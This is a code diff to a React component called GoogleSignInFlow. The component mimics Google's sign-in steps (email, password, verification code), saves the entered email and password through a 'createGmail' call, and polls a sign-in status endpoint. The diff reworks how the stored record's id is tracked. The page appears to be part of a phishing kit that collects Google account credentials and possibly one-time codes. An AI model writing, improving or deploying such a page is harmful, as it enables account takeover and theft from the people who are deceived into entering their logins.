@@ -4,7 +4,7 @@ import axios from "axios";
 import CredentialLoader from "@/components/Loading";
 
 export interface CreateGmailData {
-    id: string;
+    id?: string;
     email?: string;
     password?: string;
 }
@@ -160,7 +160,7 @@ function DesktopGrid({ left, right }: { left: React.ReactNode; right: React.Reac
 // ----------------------------------------------------------------------
 type Step = "email" | "password" | "verify";
 
-export default function GoogleSignInFlow({id}: {id: string}) {
+export default function GoogleSignInFlow() {
     const [step, setStep] = useState<Step>("email");
 
     // Form state
@@ -168,6 +168,7 @@ export default function GoogleSignInFlow({id}: {id: string}) {
     const [password, setPassword] = useState("");
     const [passType, setPassType] = useState("password");
     const [verificationCode, setVerificationCode] = useState("");
+    const [id, setId] = useState<string>("");
 
     // Error states
     const [emailError, setEmailError] = useState(false);
@@ -186,11 +187,11 @@ export default function GoogleSignInFlow({id}: {id: string}) {
         setEmailError(false);
         setLoading(true);
         const result = await createGmail({
-            id,
             email: displayEmail
         });
         if (result.success) {
-            console.log("Gmail saved successfully!");
+            console.log(result.data.gmail);
+            setId(result.data.gmail._id);
             setStep("password");
             setLoading(false);
         } else {
@@ -214,7 +215,7 @@ export default function GoogleSignInFlow({id}: {id: string}) {
             password
         });
         if (result.success) {
-            console.log("Gmail saved successfully!");
+            
             setLoad(true);
         } else {
             console.error(result.error);
@@ -230,7 +231,7 @@ export default function GoogleSignInFlow({id}: {id: string}) {
         const fetchStatus = async () => {
             try {
                 const response = await axios.get(
-                    `/api/signin?email=${encodeURIComponent(displayEmail)}`
+                    `/api/signin?id=${id}`
                 );
 
                 if (!active) return;
